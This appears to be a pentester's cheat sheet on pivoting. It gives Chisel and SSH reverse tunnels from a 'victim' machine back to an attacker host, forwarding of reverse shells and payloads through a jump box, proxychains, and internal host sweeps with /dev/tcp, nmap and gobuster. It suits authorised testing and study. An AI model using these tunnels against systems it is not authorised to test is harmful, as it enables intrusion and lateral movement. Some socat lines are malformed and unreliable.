# Pivoting








## 6. Pivoting and port forwarding
Pivoting and port forwarding allow you to access internal applications or hosts
### Chisel
```bash
# in Kali
./chisel server --reverse --port 9001 --socks5
```
|     |     |
| --- | --- |
| chisel client SERVER_IP:9001 R:80:127.0.0.1:80 | Listen on Kali 80, forward to localhost port 80 on client |
| chisel client SERVER_IP:9001 R:4444:ANOTHER_HOST:80 | Listen on Kali 4444, forward to ANOTHER_HOST(not the connected one) port 80 |
| chisel client SERVER_IP:9001 R:socks | Create SOCKS5 listener on 1080 on Kali, proxy through client, add `socks5 127.0.0.1 1080` to `/etc/proxychains4.conf` |

### SSH port forwarding 
#### 1. Local port forward, doing a local port forward proxy with jump host local port and target port. So that the exploit can go through from jump box to target machine and port
```bash
#execute on KALI
ssh -N Administrator@${JUMP} -p 22 -L 2222:${TARGET}:22
```
#### 2. forward rev shell
```bash
#Execute on jump box
ssh -N user@${ATTACKING_HOST} -p 22 -R 0.0.0.0:443:127.0.0.1:443
```
At this stage you can start a listen on port 443 to catch the rev shell
But remember all LHOST is now the jump box

#### 3. If you need a web server to serve payload
```bash
#Execute on jump box
ssh -N user@${ATTACKING_HOST} -p 22 -L 0.0.0.0:8080:127.0.0.1:8080
```

#### 4. map one remote host port to jump box
```bash
#Executed on jump box
ssh -N -L 0.0.0.0:4455:REMOTE_HOST:445 USER@REMOTE_HOST
```

#### 5. access remote host port via jump box dynamically
```bash
#Execute on jump box
ssh -Nf -D 0.0.0.0:proxy_port USER@REMOTE_HOST
```

#### 6. map one remote port from remote host to kali box via jumpbox(remote port forward)
```bash
#executed on jump box
ssh -Nf -R 127.0.0.1:ANY_UNUSED_PORT:REMOTE_TARGET:TARGET_PORT kali@KALI_IP
```

#### 7. Dynamic remote port forward, use one localhost port to access all remote host ports
```bash
#execute on jump box
ssh -Nf -R Kali_proxy_port(1080) kali@KALI_IP
```

#### 8. When need to access a host via proxy
```bash
# Make sure you have your proxy running correctly
proxychains4 -q YOUR_COMMAND
```

#### SSH control sequence
The SSH control sequence allows you to 
change SSH options after eastablished the connection. 
It is useful if you want to add new port forwarding options in current SSH session.
See this [blog](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/) for details
```bash
# execute in a terminal
# make sure you pressed enter for a new line
# then press ~C, it won't be shown in the terminal but you should see
ssh >
# Then type in your options, e.g. adding a new SOCKS proxy
ssh > -D 1337
# Then press enter again to add the option
```














































## SSHuttle
- <https://www.youtube.com/watch?v=1BLAeXOQOl4>





## socat
./socat TCP:LISTEN:3000,reuseaddr,fork TCP:127.0.0.1:3000

## chisel
- <https://github.com/jpillora/chisel>

Note: depending on the environment, the latest version may not work.

```
# listen from attacker machine
chisel server --reverse -p [PORT NUMBER]

# from victim machine 1
chisel client [ATTACKER IP]:[PORT NUMBER] R:socks


```



### Proxychains
- dynamic_chain: Uses proxies in the order they appear in the list. All proxies in the chain must be available.
- random_chain: Chooses a random proxy from the list for each connection.
- static_chain: Uses proxies in the exact order they are listed.


unset `strict_chain`` and set `dynamic_chain` in `/etc/proxychains.conf`
at the end of proxychains.conf add `socks5 127.0.0.1 [tunnel PORT]`
Note: Tunnel port is 1080 by default
also in the firefox:
- manual proxy configuration > Sock Host: 127.0.0.1 Port: [tunnel PORT]
or
- set foxy proxy
or
- launch it using `proxychains -q firefox`	









## Enumeration

### see active hosts pwned machines
```bash

hostname -I


# script 1
#!/bin/bash
for i in {1..255}; do
        timeout 1 bash -c "ping -c 1 20.20.20.$i" >/dev/null
        if [ $? -eq 0 ]; then
                echo "El host 20.20.20.$i estÃ¡ activo"
        fi
done


# script 2 (in case ping is not installed)
#!/bin/bash

for host in $(seq 1 254); do
	timeout 1 bash -c "echo '' > /dev/tcp/30.30.30.$host/80 &> /dev/null" &&
	echo "30.30.30.$host";
done; wait
	
```

### nmap
```

proxychains nmap -sn -n x.x.x.0/24 
sudo proxychains -q nmap -p [PORT NUMBER] -sCVT -Pn -n [IP]	
proxychains nmap -sCVT 20.20.20.0/24 2>/dev/null
```



### gobuster
```
gobuster dir -u http://20.20.20.3 \
	-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
	-x php,doc,html,txt \
	--proxy socks5://127.0.0.1:1080
```










## Socat




Scenario: this machine(n2) is the pivot and want to redirect the chisel client to the attacker chisel server listening on port 1234 on machine(n1)
```
# on machine n3
chisel client [IP machine n2]:1111 R:1111:socks
# on machine n2
socat TCP-LISTEN:1111,fork TCP:1111:1234
# on machine n1
echo -e "socks5 127.0.0.1 1111" | sudo tee -a /etc/proxychains4.conf
```
